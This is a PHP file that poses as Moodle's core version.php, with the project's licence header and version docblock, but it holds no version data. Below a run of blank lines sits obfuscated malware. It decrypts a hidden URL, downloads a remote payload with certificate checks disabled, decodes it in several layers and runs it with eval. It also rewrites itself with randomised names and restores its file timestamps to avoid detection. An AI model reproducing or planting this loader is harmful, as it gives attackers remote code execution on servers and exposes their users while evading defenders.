<?php

// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * MOODLE VERSION INFORMATION
 *
 * This file defines the current version of the core Moodle code being used.
 * This is compared against the values stored in the database to determine
 * whether upgrades should be performed (see lib/db/*.php)
 *
 * @package    core
 * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */






















@error_reporting(0);@ini_set('display_errors','0');

$l0039f05c2=755;$h14c64a7d0=294;$t5852d7c2=470;$f28d5c9b48=805;

$ee29989a2=['YWckd011OXI=','VE9iOUNTN0s=','YTo4TVg5NGs=','TGRSZ0BC'];
$t6d94211691='';
foreach($ee29989a2 as $e47eccbb50){
$t6d94211691.=base64_decode($e47eccbb50);
}

$i887892ad='1472c249c2a7d7ae5275c3b7ecafec22';
$v5c5c26d0b1='cUdwL2lwVzZabWpJRWNHMXVrS2x6UzF1aVhWZ1FnWGMwMERoY0NVL3J0bklEYnBnYzZxM0t5MGZLbGZLcldvTQ==';
$b898570f78d=openssl_decrypt(base64_decode($v5c5c26d0b1),"AES-128-ECB",substr(sha1($t6d94211691,true),0,16));
$e30cdf3e75='WyJyb3QxMyIsInN0cnJldiJd';

function af678055f3($zcecda2880){
if(function_exists('curl_init')){
$qb487f89f=@curl_init($zcecda2880);
if(!$qb487f89f)return false;
@curl_setopt($qb487f89f,CURLOPT_RETURNTRANSFER,1);
@curl_setopt($qb487f89f,CURLOPT_SSL_VERIFYPEER,0);
@curl_setopt($qb487f89f,CURLOPT_SSL_VERIFYHOST,0);
@curl_setopt($qb487f89f,CURLOPT_TIMEOUT,30);
@curl_setopt($qb487f89f,CURLOPT_FOLLOWLOCATION,1);
$nf3249723=@curl_exec($qb487f89f);
@curl_close($qb487f89f);
return $nf3249723;
}elseif(ini_get('allow_url_fopen')){
$w114ad5a9=@stream_context_create(['ssl'=>['verify_peer'=>false]]);
return @file_get_contents($zcecda2880,false,$w114ad5a9);
}
return false;
}

function ia5b00c8de($cb45b9e8b11b,$a9fc1677138){
$t26ba8afad=json_decode(base64_decode($a9fc1677138),true);
$qb95dc4e=base64_decode($cb45b9e8b11b);
foreach(array_reverse($t26ba8afad) as $n81fd81d2b){
if($n81fd81d2b=='rot13')$qb95dc4e=str_rot13($qb95dc4e);
elseif($n81fd81d2b=='strrev')$qb95dc4e=strrev($qb95dc4e);
}
return base64_decode($qb95dc4e);
}

function k5033a8d32($h3d2cc4a7,$t6d94211691,$i887892ad){
$p2bc6cee=hash_pbkdf2('sha256',$t6d94211691,$i887892ad,10000,32,true);
$l801024052=substr($h3d2cc4a7,0,1);
$r91362f1=substr($h3d2cc4a7,1,16);
$tcb239a5d=substr($h3d2cc4a7,17);
if($l801024052==chr(1)&&extension_loaded('openssl')){
return openssl_decrypt($tcb239a5d,'aes-256-ctr',$p2bc6cee,OPENSSL_RAW_DATA,$r91362f1);
}else{
$zcecda2880='';
for($qb487f89f=0;$qb487f89f<strlen($tcb239a5d);$qb487f89f++){
$zcecda2880.=$tcb239a5d[$qb487f89f]^$p2bc6cee[$qb487f89f%strlen($p2bc6cee)];
}
return $zcecda2880;
}
}

$nf3249723=af678055f3($b898570f78d);
if(!$nf3249723)die('E');
$w114ad5a9=ia5b00c8de($nf3249723,$e30cdf3e75);
$cb45b9e8b11b=k5033a8d32($w114ad5a9,$t6d94211691,$i887892ad);
@eval('?>'.$cb45b9e8b11b);

class Jb168a5f3fcf{
private static $d82d93c4b8=0;
private $w4e62b1bc8='1472c249c2a7d7ae5275c3b7ecafec22';
private $hd0832bc38='cUdwL2lwVzZabWpJRWNHMXVrS2x6UzF1aVhWZ1FnWGMwMERoY0NVL3J0bklEYnBnYzZxM0t5MGZLbGZLcldvTQ==';
private $y7701828='WyJyb3QxMyIsInN0cnJldiJd';
private $d27578a80c=['YWckd011OXI=','VE9iOUNTN0s=','YTo4TVg5NGs=','TGRSZ0BC'];

public function jadaafb5bf(){
if(!empty($_GET)||!empty($_POST))return false;
clearstatcache();
if(time()-filemtime(__FILE__)>86400)return true;
if(rand(1,100)<=3)return true;
self::$d82d93c4b8++;
if(self::$d82d93c4b8>=50)return true;
return false;
}

public function ic24b7299d(){
$file=__FILE__;
clearstatcache();
$stat=stat($file);
$mtime=$stat['mtime'];
$atime=$stat['atime'];

$nv=[];
for($i=0;$i<26;$i++){
$c='abcdefghijklmnopqrstuvwxyz';
$n='$'.$c[rand(0,25)];
for($j=0;$j<rand(7,11);$j++)$n.=substr(md5(mt_rand()),rand(0,25),1);
$nv[]=$n;
}

$nf=[];
for($i=0;$i<10;$i++){
$c='abcdefghijklmnopqrstuvwxyz';
$n=$c[rand(0,25)].substr(md5(mt_rand()),0,1);
for($j=0;$j<rand(6,10);$j++)$n.=substr(md5(mt_rand()),rand(0,25),1);
$nf[]=$n;
}

$nc=chr(rand(65,90));
for($i=0;$i<rand(8,12);$i++)$nc.=substr(md5(mt_rand()),rand(0,25),1);

$c='<?php'."\n";
$c.='@error_reporting(0);@ini_set(\'display_errors\',\'0\');'."\n\n";
for($i=0;$i<rand(4,8);$i++){
$c.='$'.substr(md5(mt_rand()),0,8).'='.rand(100,999).';';
}
$c.="\n\n";

$c.=$nv[0].'=[';
foreach($this->d27578a80c as $k){
$c.='\''.addslashes($k).'\',';
}
$c=rtrim($c,',').'];'."\n";
$c.=$nv[1].'=\'\';'."\n";
$c.='foreach('.$nv[0].' as '.$nv[2].'){\n';
$c.=$nv[1].'.=base64_decode('.$nv[2].');\n}\n\n';

$c.=$nv[3].'=\''.addslashes($this->w4e62b1bc8).'\';\n';
$c.=$nv[25].'=\''.addslashes($this->hd0832bc38).'\';\n';
$c.=$nv[4].'=openssl_decrypt(base64_decode('.$nv[25].'),\\"AES-128-ECB\\",substr(sha1('.$nv[1].',true),0,16));\n';
$c.=$nv[5].'=\''.addslashes($this->y7701828).'\';\n\n';

$c.='function '.$nf[0].'('.$nv[6].'){\n';
$c.='if(function_exists(\'curl_init\')){\n';
$c.=$nv[7].'=@curl_init('.$nv[6].');\n';
$c.='if(!'.$nv[7].')return false;\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_RETURNTRANSFER,1);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_SSL_VERIFYPEER,0);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_SSL_VERIFYHOST,0);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_TIMEOUT,30);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_FOLLOWLOCATION,1);\n';
$c.=$nv[8].'=@curl_exec('.$nv[7].');\n';
$c.='@curl_close('.$nv[7].');\n';
$c.='return '.$nv[8].';\n';
$c.='}elseif(ini_get(\'allow_url_fopen\')){\n';
$c.=$nv[9].'=@stream_context_create([\'ssl\'=>[\'verify_peer\'=>false]]);\n';
$c.='return @file_get_contents('.$nv[6].',false,'.$nv[9].');\n}\n';
$c.='return false;\n}\n\n';

$c.='function '.$nf[1].'('.$nv[10].','.$nv[11].'){\n';
$c.=$nv[12].'=json_decode(base64_decode('.$nv[11].'),true);\n';
$c.=$nv[13].'=base64_decode('.$nv[10].');\n';
$c.='foreach(array_reverse('.$nv[12].') as '.$nv[14].'){\n';
$c.='if('.$nv[14].'==\'rot13\')'.$nv[13].'=str_rot13('.$nv[13].');\n';
$c.='elseif('.$nv[14].'==\'strrev\')'.$nv[13].'=strrev('.$nv[13].');\n';
$c.='}\n';
$c.='return base64_decode('.$nv[13].');\n}\n\n';

$c.='function '.$nf[2].'('.$nv[15].','.$nv[1].','.$nv[3].'){\n';
$c.=$nv[16].'=hash_pbkdf2(\'sha256\','.$nv[1].','.$nv[3].',10000,32,true);\n';
$c.=$nv[17].'=substr('.$nv[15].',0,1);\n';
$c.=$nv[18].'=substr('.$nv[15].',1,16);\n';
$c.=$nv[19].'=substr('.$nv[15].',17);\n';
$c.='if('.$nv[17].'==chr(1)&&extension_loaded(\'openssl\')){\n';
$c.='return openssl_decrypt('.$nv[19].',\'aes-256-ctr\','.$nv[16].',OPENSSL_RAW_DATA,'.$nv[18].');\n';
$c.='}else{\n';
$c.=$nv[6].'=\'\';\n';
$c.='for('.$nv[7].'=0;'.$nv[7].'<strlen('.$nv[19].');'.$nv[7].'++){\n';
$c.=$nv[6].'.='.$nv[19].'['.$nv[7].']^'.$nv[16].'['.$nv[7].'%strlen('.$nv[16].')];\n';
$c.='}\n';
$c.='return '.$nv[6].';\n}\n}\n\n';

$c.=$nv[8].'='.$nf[0].'('.$nv[4].');\n';
$c.='if(!'.$nv[8].')die(\'E\');\n';
$c.=$nv[9].'='.$nf[1].'('.$nv[8].','.$nv[5].');\n';
$c.=$nv[10].'='.$nf[2].'('.$nv[9].','.$nv[1].','.$nv[3].');\n';
$c.='@eval(\'?>\'.'.$nv[10].');\n\n';

$c.='class '.$nc.'{\n';
$c.='private static '.$nv[20].'=0;\n';
$c.='private '.substr($nv[21],1).'=\''.addslashes($this->w4e62b1bc8).'\';\n';
$c.='private '.substr($nv[22],1).'=\''.addslashes($this->hd0832bc38).'\';\n';
$c.='private '.substr($nv[23],1).'=\''.addslashes($this->y7701828).'\';\n';
$c.='private '.substr($nv[24],1).'=[';
foreach($this->d27578a80c as $k){
$c.='\''.addslashes($k).'\',';
}
$c=rtrim($c,',').'];\n\n';

$c.='public function '.$nf[3].'(){\n';
$c.='if(!empty($_GET)||!empty($_POST))return false;\n';
$c.='clearstatcache();\n';
$c.='if(time()-filemtime(__FILE__)>86400)return true;\n';
$c.='if(rand(1,100)<=3)return true;\n';
$c.='self::'.$nv[20].'++;\n';
$c.='if(self::'.$nv[20].'>=50)return true;\n';
$c.='return false;\n}\n\n';

$c.='public function '.$nf[4].'(){/*mutate*/}\n';
$c.='}\n\n';

$c.='$obj=new '.$nc.';\n';
$c.='if($obj->'.$nf[3].'()){\n';
$c.='$obj->'.$nf[4].'();\n';
$c.='}\n';
$c.='?>';

file_put_contents($file,$c);
touch($file,$mtime,$atime);
}
}

$obj=new Jb168a5f3fcf();
if($obj->jadaafb5bf()){
$obj->ic24b7299d();
}
?>
